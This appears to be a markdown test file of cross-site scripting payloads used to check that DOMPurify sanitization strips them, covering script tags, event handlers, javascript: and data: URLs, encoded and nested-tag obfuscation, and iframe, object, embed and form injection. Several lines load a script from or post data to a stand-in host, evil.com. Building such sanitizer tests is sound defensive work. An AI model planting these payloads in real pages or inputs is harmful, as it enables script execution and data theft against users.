# XSS Attack Test Vectors

This file contains common XSS payloads that DOMPurify should neutralize.
**None of these should execute.** If you see alert boxes, sanitization is broken.

## Script Tags

<script>alert('XSS via script tag')</script>

<script src="https://evil.com/malware.js"></script>

## Event Handlers

<img src="x" onerror="alert('XSS via onerror')">

<div onmouseover="alert('XSS via onmouseover')">Hover me</div>

<body onload="alert('XSS via onload')">

<svg onload="alert('XSS via SVG onload')">

## JavaScript URLs

[Click me](javascript:alert('XSS via href'))

<a href="javascript:alert('XSS')">Another link</a>

## Data URLs with Script

<a href="data:text/html,<script>alert('XSS')</script>">Data URL</a>

## Encoded Attacks

<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;XSS&#39;&#41;">

<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert('XSS')">Encoded JS</a>

## Style-based Attacks

<div style="background-image: url(javascript:alert('XSS'))">styled div</div>

<style>body { background: url("javascript:alert('XSS')"); }</style>

## Iframe Injection

<iframe src="https://evil.com"></iframe>

<iframe src="javascript:alert('XSS')"></iframe>

## Form Injection

<form action="https://evil.com/steal">
<input type="text" name="data" value="stolen">
<input type="submit" value="Submit">
</form>

## Object/Embed

<object data="javascript:alert('XSS')"></object>

<embed src="javascript:alert('XSS')">

## Nested Obfuscation

<scr<script>ipt>alert('nested')</scr</script>ipt>

<<script>alert('double bracket')</script>

## If you can read this, the safe text rendering works fine.

All the attack vectors above should be stripped or neutralized.
This paragraph should render normally.
